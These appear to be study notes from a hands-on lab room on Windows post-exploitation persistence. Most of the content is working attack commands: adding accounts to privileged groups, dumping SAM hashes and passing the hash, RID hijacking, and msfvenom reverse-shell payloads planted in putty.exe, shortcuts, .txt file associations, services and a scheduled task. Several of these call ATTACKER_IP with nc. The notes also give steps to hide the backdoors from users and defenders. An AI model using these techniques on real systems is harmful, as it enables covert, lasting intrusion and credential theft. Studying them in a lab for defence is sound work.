## Introduction 

When you first gain access to a target’s internal network, one of your top priorities is establishing **persistence**—a reliable way to regain access without having to exploit the system again. Persistence ensures you don’t lose your foothold before reaching high‑value assets.

Attackers rush to establish persistence because:

- **Re‑exploitation may fail**: Some exploits are unstable and only work once.
- **Initial access is hard to repeat**: Phishing or social engineering might not succeed a second time.
- **Defenders react quickly**: Once suspicious activity is detected, vulnerabilities may be patched or credentials rotated.

While attackers could reuse stolen credentials, those can change. More covert persistence techniques make it harder for defenders to remove the attacker

## Tampering With Unprivileged Accounts

- **GOAL**
However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

#NOTE  When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.  

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

#### Assign Group Memberships
assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

```Command Prompt
C:\> net localgroup administrators thmuser0 /add
```
**Note**: This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If that looks too suspicious, we can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
- Adding the account to the Backup Operators group
```Command Prompt
C:\> net localgroup "Backup Operators" thmuser1 /add
```

- We add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups to be able to RDP or WinRM back to the machine
```Command Prompt
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

- Connecting from the attacker machine with WinRM
```linux
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```
**Note**: if you are using WinRM, you are possible to confined to a limited access token with no administrative privileges.

- To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```Command Prompt
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```linux
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
```

```linux
*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
```

```linux
*Evil-WinRM* PS C:\> download system.bak
```

```linux
*Evil-WinRM* PS C:\> download sam.bak
```
**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

- With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools
```linux
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```linux
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

#### Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself.


In the case of the Backup Operators group, it has the following two privileges assigned by default:

- **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
- **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:
```powershell
secedit /export /cfg config.inf
```
We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

- We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
```powershell
secedit /import /cfg config.inf /db config.sdb
```

```Powershell
secedit /configure /db config.sdb /cfg config.inf
```

- To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this)
```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```
*Note*: This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy**

```Command Prompt
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!
```powershell
net user thmuser2
```

#### RID Hijacking
Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

- To find the assigned RIDs for any user, you can use the following command:
```Command Prompt
wmic useraccount get name,sid
```

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

```Command Prompt
PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine

Note: the RID is stored using little-endian notation, so its bytes appear reversed.

Note: using rdp to connect to the thmuser3
```Powershell
xfreerdp /v:MACHINE-IP /u:thmuser3 /p:Password321
```

## Backdooring Files
Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

hile there are many opportunities to plant backdoors, we will check the most commonly used ones.

#### Executable Files
If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
You can easily plant a payload of your preference in any .exe file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

#### Shortcut Files
If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

For this task, let's check the shortcut to **calc** on the Administrator's desktop. If we right-click it and go to properties, we'll see where it is pointing:

- Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```
NOTE: Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user.

- We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. The final target of the shortcut would be:
```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

- Let's start an nc listener to receive our reverse shell on our attacker's machine:
```Command Prompt
nc -lvp 4445
```
NOTE: If you double-click the shortcut, you should get a connection back to your attacker's machine. Meanwhile, the user will get a calculator just as expected by them. You will probably notice a command prompt flashing up and disappearing immediately on your screen. A regular user might not mind too much about that, hopefully.

#### Hijacking File Associations
In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`.

Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified:

In this case, when you try to open a .txt file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, let's create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```


## Abusing Services
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

#### Creating backdoor services
We can create and start a service named "THMservice" using the following commands:

```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Note:** There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:

AttackBox

```command prompt
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```
- starting server
```command prompt
sudo python3 -m http.server
```
- **Downloading file with powershell**
```Powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://attacker_ip:8000/name_of_payload.exe','name_of_payload.exe')"
```

You can then copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

This should create a connection back to your attacker's machine.

####  Modifying existing services
While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it

- You can get a list of available services using the following command:
```Command Prompt
C:\> sc.exe query state=all
```

- You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command:
```Command Prompt
C:\> sc.exe qc THMService3
```

There are three things we care about when using a service for persistence:

- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The service **START_TYPE** should be automatic so that the payload runs without user interaction.
- The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

- Let's start by creating a new reverse shell with msfvenom
```AttackBox
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

- To reconfigure "THMservice3" parameters, we can use the following command:
```Command Prompt
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

- You can then query the service's configuration again to check if all went as expected:
```Command Prompt
C:\> sc.exe qc THMservice3
```

## Abusing Scheduled Tasks
We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:
#### Task Scheduler
The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, you can use `schtasks` to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks).

- Let's create a task that runs a reverse shell every single minute. In a real-world scenario, you wouldn't want your payload to run so often, but we don't want to wait too long for this room:
```Command Prompt
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```
**Note:** Be sure to use `THM-TaskBackdoor` as the name of your task, or you won't get the flag.

The previous command will create a "THM-TaskBackdoor" task and execute an `nc64` reverse shell back to the attacker. The `/sc` and `/mo` options indicate that the task should be run every single minute. The `/ru` option indicates that the task will run with SYSTEM privileges.

- To check if our task was successfully created, we can use the following command:
```Command Prompt
C:\> schtasks /query /tn thm-taskbackdoor
```

#### Making Our Task Invisible
Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named "SD" contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.

- To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use `psexec` (available in `C:\tools`) to open Regedit with SYSTEM privileges:
```Commant Prompt
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```
If we try to query our service again, the system will tell us there is no such task:

- for the reverse part for listening
```AttackBox
nc -lvp 4449
```
